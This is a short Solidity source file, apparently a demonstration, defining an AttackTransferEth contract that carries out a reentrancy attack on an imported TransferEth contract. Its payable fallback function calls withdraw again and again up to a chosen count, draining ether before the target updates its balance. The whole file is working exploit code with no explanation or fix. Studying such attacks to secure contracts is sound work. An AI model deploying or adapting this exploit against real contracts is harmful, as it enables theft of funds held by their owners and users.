pragma solidity ^0.4.25;

import './TransferEth.sol';

contract AttackTransferEth {

    TransferEth teth;
    uint256 value = 1000000000000000000;
    uint256 count = 1;
    uint256 i =0;

    event LogAttack(uint256 i, uint256 balance);

    constructor(address _addr) public {
        teth = TransferEth(_addr);
    }

    function () public payable{
        i++;
        LogAttack(i, this.balance);
        if (i < count) teth.withdraw(value);

    }

    function attack(uint256 _count, uint256 _value) {
        count = _count;
        value = _value;
        teth.withdraw(value);
    }
}